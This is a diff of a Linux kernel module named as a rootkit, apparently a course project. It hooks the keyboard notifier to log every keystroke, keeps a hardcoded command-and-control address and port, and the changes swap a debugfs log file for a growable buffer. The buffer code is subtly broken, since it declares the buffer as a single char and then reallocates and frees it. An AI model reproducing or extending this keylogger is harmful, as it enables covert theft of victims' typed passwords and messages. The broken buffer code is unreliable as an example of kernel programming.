@@ -10,20 +10,17 @@
 #include <linux/inet.h>
 #include <linux/keyboard.h>
 #include <linux/input.h>
-#include <linux/debugfs.h>
 
 MODULE_LICENSE("GPL");
 #define NOTIFY_OK 0x0001 // This tells the kernel that everything is OK.
 #define MAX_KEY_LEN 12 // This is the longest key length in key buffer 
 
-static const char *keys[][2] = {{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"},{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"},{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"},{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"_PAUSE_", "_PAUSE_"}};
+static const char *keys[][2] = {{"\0", "\0"}, {"ESC", "ESC"}, {"1", "!"}, {"2", "@"},{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},{"-", "_"}, {"=", "+"}, {"BACKSPACE", "BACKSPACE"},{"TAB", "TAB"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},{"\n", "\n"}, {"CTRL", "CTRL"}, {"a", "A"}, {"s", "S"},{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},{"'", "\""}, {"`", "~"}, {"SHIFT", "SHIFT"}, {"\\", "|"},{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"SHIFT", "SHIFT"}, {"PRTSCR", "KPD*"},{"ALT", "ALT"}, {" ", " "}, {"CAPS", "CAPS"}, {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"}, {"NUM", "NUM"}, {"SCROLL", "SCROLL"},{"KPD7", "HOME"}, {"KPD8", "UP"}, {"KPD9", "PGUP"},{"-", "-"}, {"KPD4", "LEFT"}, {"KPD5", "KPD5"},{"KPD6", "RIGHT"}, {"+", "+"}, {"KPD1", "END"},{"KPD2", "DOWN"}, {"KPD3", "PGDN"}, {"KPD0", "INS"},{"KPD.", "DEL"}, {"SYSRQ", "SYSRQ"}, {"\0", "\0"},{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"KPENTER", "KPENTER"}, {"CTRL", "CTRL"}, {"/", "/"},{"PRTSCR", "PRTSCR"}, {"ALT", "ALT"}, {"\0", "\0"},{"HOME", "HOME"}, {"UP", "UP"}, {"PGUP", "PGUP"},{"LEFT", "LEFT"}, {"RIGHT", "RIGHT"}, {"END", "END"},{"DOWN", "DOWN"}, {"PGDN", "PGDN"}, {"INS", "INS"},{"DEL", "DEL"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"PAUSE", "PAUSE"}};
 
-static int maxBufSize = 1024;
-static char keysToWrite[1024] = {0};
+static int maxBufSize = 5120;
+static char keysToWrite;
 static size_t bufSize = 0;
-static struct dentry* file; //File to be written to
-static struct dentry* subdir; // Directory Created to contain the file
-
+static bool unreg = false;
 static int C2_PORT = 1337;
 static char * C2_IP = "192.168.56.1";
 struct socket *sock = NULL;
@@ -41,24 +38,6 @@ enum commands {
 };
 
 static int keylogFunc(struct notifier_block*, unsigned long, void*);
-static ssize_t readKeys(struct file* fp, char* buffer, size_t len, loff_t* offset);
-
-/*
-* readKeys: This function is the read for the file operations, it will read from the device created and write it to the file presented
-* @param struct file* file: The file in user space to be written to
-* @param char* buffer: the buffer that will be written to the files
-* @param size_t len: length of the buffer
-* @param loff_t offset: where to start in the buffer
-*/
-static ssize_t readKeys(struct file* fp, char* buffer, size_t len, loff_t* offset){
-    return simple_read_from_buffer(buffer, len, offset, keysToWrite, bufSize);
-}
-
-
-const struct file_operations keyOps = {
-    .owner = THIS_MODULE,
-    .read = readKeys,
-};
 
 /*
 * keycodeToAscii: This will take the given keycode and transform it based off the code and shift 
@@ -100,14 +79,20 @@ static int keylogFunc(struct notifier_block *blk, unsigned long code, void *_par
 
       // Reset buffer position before we go out of bounds
       if ((bufSize + strlen(buf)) >= maxBufSize){
-        bufSize = 0;
+        char* tmp = krealloc(keysToWrite, (maxBufSize*2)*sizeof(char), GFP_KERNEL);
+        maxBufSize = maxBufSize*2;
+        if (tmp == NULL){
+          kfree(keysToWrite);
+          printk(KERN_INFO "Bad Realloc\n");
+        } else {
+          keysToWrite = tmp;
+        }
       }
       strncpy(keysToWrite + bufSize, buf, strlen(buf));
       bufSize += strlen(buf);
     }
     return NOTIFY_OK;
 }
-
 
 static struct notifier_block keylogger = {
     .notifier_call = keylogFunc
@@ -166,9 +151,6 @@ static int __init rootkit_init(void) {
 
     printk(KERN_INFO "Loaded kernel module\n");
 
-    //Create the directory and the file
-    subdir = debugfs_create_dir("447", NULL);
-    file = debugfs_create_file("kylg", 0400, subdir, NULL, &keyOps);
     register_keyboard_notifier(&keylogger);
     while (!shutdown) {
         printk(KERN_INFO "Creating socket\n");
@@ -244,13 +226,16 @@ cleanup:
         }
     }
 uninstall:
+    unregister_keyboard_notifier(&keylogger);
+    unreg = true;
     return retval;
 }
 
 static void __exit rootkit_exit(void) {
     printk(KERN_INFO "Removed kernel module\n");
-    debugfs_remove_recursive(subdir);
-    unregister_keyboard_notifier(&keylogger);
+    if (!(unreg)){
+        unregister_keyboard_notifier(&keylogger);
+    }
 }
 
 module_init(rootkit_init);
